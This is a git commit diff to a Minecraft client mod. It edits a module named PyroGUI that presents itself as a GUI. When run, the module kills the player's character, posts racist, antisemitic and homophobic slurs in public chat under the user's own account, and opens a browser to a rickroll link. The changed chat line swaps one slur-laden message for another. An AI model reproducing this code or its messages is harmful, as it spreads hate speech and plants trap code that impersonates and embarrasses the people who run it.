4464d69bdc84041556ad8fb6c0c60c794f817ee2
ProfKambing <80607981+ProfKambing@users.noreply.github.com>
2021-05-15 20:50:27 +0800

    listed stfu

--- src/main/java/me/trambled/ozark/ozarkclient/module/gui/PyroGUI.java
+++ src/main/java/me/trambled/ozark/ozarkclient/module/gui/PyroGUI.java
@@ -24,7 +24,7 @@ public class PyroGUI extends Module {
         if (mc.player != null)
             MessageUtil.send_client_message("EZZZ KID COPE MORE HAHAHAHAHHA GOTEM");
         mc.player.sendChatMessage("/kill");
-        mc.player.sendChatMessage("I am kambing (who?), a pedophile, a larper, a newfag, a fitfag, a nigger, a jew, and a retard");
+        mc.player.sendChatMessage("Im a jew and support israel, so im a nigger and braindead!!!");
         //:troll:
            try {
                 Desktop.getDesktop().browse(URI.create("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
